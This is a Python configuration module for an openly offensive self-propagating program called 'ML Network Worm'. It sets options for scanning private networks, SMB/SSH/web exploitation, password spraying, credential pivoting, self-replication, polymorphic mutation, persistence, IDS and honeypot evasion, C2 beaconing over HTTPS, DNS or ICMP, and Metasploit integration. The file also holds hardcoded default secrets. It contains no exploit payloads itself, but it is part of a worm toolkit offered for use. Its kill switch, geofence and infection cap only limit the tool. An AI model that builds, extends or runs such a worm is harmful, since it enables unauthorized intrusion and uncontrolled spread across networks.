"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
ML Network Worm - Configuration Management
Handles all configuration settings for the worm
"""


import ipaddress
import os
from dataclasses import dataclass, field
from typing import Any, Dict, List

import yaml


@dataclass
class NetworkConfig:
    """Network scanning and targeting configuration"""

    target_ranges: List[str] = field(default_factory=lambda: ["192.168.1.0/24"])
    excluded_ips: List[str] = field(default_factory=lambda: ["192.168.1.1"])  # Router, etc.
    scan_timeout: int = 5
    max_threads: int = 50
    ports_to_scan: List[int] = field(
        default_factory=lambda: [21, 22, 23, 80, 135, 139, 443, 445, 3389, 5985, 8080]
    )


@dataclass
class ExploitConfig:
    """Exploitation settings"""

    max_exploit_attempts: int = 3
    exploit_timeout: int = 30
    use_credentials: bool = True
    credential_wordlist: str = "wordlists/common_creds.txt"
    wordlist_dir: str = "wordlists"
    enable_smb: bool = True
    enable_ssh: bool = True
    enable_web: bool = True
    enable_password_spray: bool = True
    spray_delay: float = 1.0
    lockout_threshold: int = 5
    enable_credential_pivoting: bool = True
    enable_mutation: bool = True


@dataclass
class PropagationConfig:
    """Propagation behavior settings"""

    max_infections: int = 100  # Safety limit
    propagation_delay: float = 2.0  # Seconds between infections
    persistence_enabled: bool = True
    self_replicate: bool = True
    mutation_enabled: bool = True  # Polymorphic payloads


@dataclass
class EvasionConfig:
    """Stealth and evasion settings"""

    stealth_mode: bool = True
    randomize_timing: bool = True
    detect_honeypots: bool = True
    detect_ids: bool = True
    encrypt_traffic: bool = True
    max_scan_rate: int = 100  # packets per second


@dataclass
class C2Config:
    """Command & Control settings"""

    c2_server: str = "127.0.0.1"
    c2_port: int = 8443
    beacon_interval: int = 60  # seconds
    use_encryption: bool = True
    backup_c2_servers: List[str] = field(default_factory=list)
    c2_protocol: str = "https"  # https, dns, icmp


@dataclass
class MLConfig:
    """Machine Learning model settings"""

    host_classifier_path: str = "ml_models/saved/host_classifier.pkl"
    rl_agent_path: str = "ml_models/saved/rl_agent.zip"
    evasion_model_path: str = "ml_models/saved/evasion_model.pkl"
    use_pretrained: bool = False  # Set True to auto-train on startup
    online_learning: bool = True  # Learn during operation
    use_thompson_sampling: bool = (
        False  # Use Thompson Sampling (ensemble) instead of epsilon-greedy
    )


@dataclass
class SafetyConfig:
    """Safety and containment settings"""

    kill_switch_enabled: bool = True
    kill_switch_code: str = field(
        default_factory=lambda: os.environ.get("WORMY_KILL_SWITCH", "EMERGENCY_STOP_2024")
    )
    auto_destruct_time: int = 0  # 0 = disabled, otherwise hours
    geofence_enabled: bool = True
    allowed_networks: List[str] = field(
        default_factory=lambda: ["192.168.0.0/16", "10.0.0.0/8", "172.16.0.0/12"]
    )
    max_runtime_hours: int = 24
    enable_logging: bool = True
    log_encryption: bool = True


@dataclass
class MetasploitConfig:
    """Metasploit RPC integration settings"""

    enabled: bool = False
    host: str = "127.0.0.1"
    port: int = 55553
    user: str = "msf"
    password: str = "wormy2024"  # Override via MSF_PASSWORD env var
    auto_start: bool = False
    lhost: str = ""  # Auto-detected if empty
    lport_base: int = 4444


class Config:
    """Main configuration class"""

    def __init__(self, config_file: str = None, profile: str = None):
        self.network = NetworkConfig()
        self.exploit = ExploitConfig()
        self.propagation = PropagationConfig()
        self.evasion = EvasionConfig()
        self.c2 = C2Config()
        self.ml = MLConfig()
        self.safety = SafetyConfig()
        self.metasploit = MetasploitConfig()

        # Load from file if provided
        if config_file and os.path.exists(config_file):
            self.load_from_file(config_file, profile)

        # Override Metasploit password from env var
        msf_password = os.getenv("MSF_PASSWORD")
        if msf_password:
            self.metasploit.password = msf_password

    def load_from_file(self, config_file: str, profile: str = None):
        """Load configuration from YAML file, optionally applying profile overrides"""
        with open(config_file, "r") as f:
            config_data = yaml.safe_load(f)

        def deep_merge(base: Dict, override: Dict) -> Dict:
            """Deep merge two dictionaries"""
            result = dict(base)
            for key, value in override.items():
                if key in result and isinstance(result[key], dict) and isinstance(value, dict):
                    result[key] = deep_merge(result[key], value)
                else:
                    result[key] = value
            return result

        def apply_section(section_name: str, data: Dict):
            """Apply a config section to the corresponding dataclass"""
            attr_map = {
                "network": "network",
                "exploit": "exploit",
                "propagation": "propagation",
                "evasion": "evasion",
                "c2": "c2",
                "ml": "ml",
                "safety": "safety",
                "metasploit": "metasploit",
            }
            target_attr = attr_map.get(section_name)
            if target_attr and hasattr(self, target_attr):
                self._update_dataclass(getattr(self, target_attr), data)

        # Apply base config
        for section in ["network", "exploit", "propagation", "evasion", "c2", "ml", "safety", "metasploit"]:
            if section in config_data:
                apply_section(section, config_data[section])

        # Apply profile overrides if specified
        if profile and "profiles" in config_data and profile in config_data["profiles"]:
            profile_data = config_data["profiles"][profile]
            # Remove non-config keys
            profile_data.pop("description", None)
            for section, overrides in profile_data.items():
                if isinstance(overrides, dict) and section in config_data:
                    merged = deep_merge(config_data.get(section, {}), overrides)
                    apply_section(section, merged)
                elif isinstance(overrides, dict):
                    apply_section(section, overrides)

    def _update_dataclass(self, obj, data: Dict[str, Any]):
        """Update dataclass fields from dictionary"""
        for key, value in data.items():
            if hasattr(obj, key):
                setattr(obj, key, value)

    def save_to_file(self, config_file: str):
        """Save configuration to YAML file"""
        config_data = {
            "network": self.network.__dict__,
            "exploit": self.exploit.__dict__,
            "propagation": self.propagation.__dict__,
            "evasion": self.evasion.__dict__,
            "c2": self.c2.__dict__,
            "ml": self.ml.__dict__,
            "safety": self.safety.__dict__,
        }

        with open(config_file, "w") as f:
            yaml.dump(config_data, f, default_flow_style=False)

    def validate(self) -> bool:
        """Validate configuration settings"""
        errors = []
        warnings = []

        # Safety checks (CRITICAL)
        if not self.safety.kill_switch_enabled:
            errors.append("❌ Kill switch must be enabled for safety")

        if not self.safety.geofence_enabled:
            errors.append("❌ Geofencing must be enabled for safety")

        if self.propagation.max_infections <= 0:
            errors.append("❌ max_infections must be positive")

        # Network validation
        if not self.network.target_ranges:
            errors.append("❌ At least one target range must be specified")
        else:
            # Validate CIDR notation
            for range_str in self.network.target_ranges:
                try:
                    ipaddress.ip_network(range_str, strict=False)
                except ValueError as e:
                    errors.append(f"❌ Invalid network range '{range_str}': {e}")

        # Validate excluded IPs
        for ip_str in self.network.excluded_ips:
            try:
                ipaddress.ip_address(ip_str)
            except ValueError:
                warnings.append(f"⚠️  Invalid excluded IP '{ip_str}'")

        # Port validation
        for port in self.network.ports_to_scan:
            if not (1 <= port <= 65535):
                errors.append(f"❌ Invalid port number: {port} (must be 1-65535)")

        # C2 validation
        if not self.c2.c2_server:
            errors.append("❌ C2 server must be specified")

        if not (1 <= self.c2.c2_port <= 65535):
            errors.append(f"❌ Invalid C2 port: {self.c2.c2_port}")

        # ML model file validation
        if self.ml.use_pretrained:
            if self.ml.rl_agent_path and not os.path.exists(self.ml.rl_agent_path):
                warnings.append(f"⚠️  RL agent model not found: {self.ml.rl_agent_path}")

            if self.ml.host_classifier_path and not os.path.exists(self.ml.host_classifier_path):
                warnings.append(f"⚠️  Host classifier not found: {self.ml.host_classifier_path}")

        # Credential wordlist validation
        if self.exploit.use_credentials:
            if not os.path.exists(self.exploit.credential_wordlist):
                warnings.append(
                    f"⚠️  Credential wordlist not found: {self.exploit.credential_wordlist}"
                )

        # Thread count validation
        if self.network.max_threads > 500:
            warnings.append(
                f"⚠️  Very high thread count ({self.network.max_threads}) may cause system instability"
            )

        if self.network.max_threads < 1:
            errors.append("❌ max_threads must be at least 1")

        # Timeout validation
        if self.network.scan_timeout < 1:
            warnings.append("⚠️  Very low scan timeout may miss hosts")

        if self.exploit.exploit_timeout < 5:
            warnings.append("⚠️  Very low exploit timeout may cause failures")

        # Print results
        if errors or warnings:
            print("\n" + "=" * 60)
            print("CONFIGURATION VALIDATION")
            print("=" * 60)

        if errors:
            print("\n🔴 ERRORS (must fix):")
            for error in errors:
                print(f"  {error}")

        if warnings:
            print("\n🟡 WARNINGS (review recommended):")
            for warning in warnings:
                print(f"  {warning}")

        if errors or warnings:
            print("=" * 60 + "\n")

        return len(errors) == 0

    def validate_aggressive_mode(self) -> bool:
        """Additional validation for aggressive mode configurations"""
        warnings = []

        # Check for dangerous settings
        if self.propagation.max_infections > 1000:
            warnings.append("⚠️  AGGRESSIVE: Very high infection limit")

        if self.network.max_threads > 200:
            warnings.append("⚠️  AGGRESSIVE: Very high thread count")

        if self.propagation.propagation_delay < 0.5:
            warnings.append("⚠️  AGGRESSIVE: Very fast propagation may trigger detection")

        if not self.evasion.stealth_mode:
            warnings.append("⚠️  AGGRESSIVE: Stealth mode disabled - high detection risk")

        if self.safety.max_runtime_hours == 0:
            warnings.append("⚠️  AGGRESSIVE: No runtime limit set")

        if self.safety.auto_destruct_time == 0:
            warnings.append("⚠️  AGGRESSIVE: No auto-destruct timer set")

        if warnings:
            print("\n" + "=" * 60)
            print("⚠️  AGGRESSIVE MODE WARNINGS")
            print("=" * 60)
            for warning in warnings:
                print(f"  {warning}")
            print("\nThese settings are intentional for aggressive mode.")
            print("Ensure you have proper authorization!")
            print("=" * 60 + "\n")

        return True

    def __str__(self) -> str:
        """String representation of configuration"""
        return f"""
ML Network Worm Configuration:
==============================
Network:
  Target Ranges: {self.network.target_ranges}
  Excluded IPs: {self.network.excluded_ips}
  Scan Timeout: {self.network.scan_timeout}s
  Max Threads: {self.network.max_threads}

Exploitation:
  Max Attempts: {self.exploit.max_exploit_attempts}
  SMB: {self.exploit.enable_smb}
  SSH: {self.exploit.enable_ssh}
  Web: {self.exploit.enable_web}

Propagation:
  Max Infections: {self.propagation.max_infections}
  Delay: {self.propagation.propagation_delay}s
  Persistence: {self.propagation.persistence_enabled}
  Mutation: {self.propagation.mutation_enabled}

Evasion:
  Stealth Mode: {self.evasion.stealth_mode}
  Detect Honeypots: {self.evasion.detect_honeypots}
  Encrypt Traffic: {self.evasion.encrypt_traffic}

C2:
  Server: {self.c2.c2_server}:{self.c2.c2_port}
  Beacon Interval: {self.c2.beacon_interval}s
  Protocol: {self.c2.c2_protocol}

Safety:
  Kill Switch: {self.safety.kill_switch_enabled}
  Geofence: {self.safety.geofence_enabled}
  Max Runtime: {self.safety.max_runtime_hours}h
  Logging: {self.safety.enable_logging}
"""


# Global configuration instance
config = Config()


if __name__ == "__main__":
    # Example: Create default config file
    config = Config()
    config.save_to_file("config.yaml")
    print("Default configuration saved to config.yaml")
    print(config)
